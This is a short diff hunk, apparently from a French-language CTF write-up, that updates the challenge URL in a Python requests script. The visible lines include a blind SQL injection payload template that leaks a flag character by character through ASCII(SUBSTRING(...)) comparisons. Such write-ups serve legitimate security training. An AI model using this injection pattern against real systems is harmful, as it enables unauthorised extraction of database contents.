@@ -30,7 +30,7 @@ Avec les deux requêtes précédentes, on peut apprendre qu'il n'y a qu'une seul
 # -*- encoding: utf-8 -*-
 import requests
 
-URL = "https://unitedctf.ca:18000/challenge3.php"
+URL = "https://challenges.unitedctf.ca:18000/challenge3.php"
 HEADERS = {}
 
 query = "' OR ASCII(SUBSTRING(flag, {}, 1)) > {} -- " # Placeholders are for Position and ascii value respectively
